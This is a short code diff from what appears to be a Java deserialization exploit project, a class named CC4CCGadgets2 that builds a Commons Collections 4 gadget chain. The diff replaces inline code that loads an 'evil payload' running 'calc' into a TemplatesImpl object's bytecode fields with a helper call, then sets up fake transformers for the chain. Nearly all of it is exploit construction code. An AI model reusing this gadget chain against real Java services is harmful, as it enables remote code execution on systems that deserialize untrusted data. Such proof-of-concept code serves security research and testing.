@@ -13,12 +13,7 @@ import java.util.PriorityQueue;
 
 public class CC4CCGadgets2 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates ,"_name" ,"xxx");
-        Utils.setValue(templates ,"_class" ,null);
-        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
-        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
 
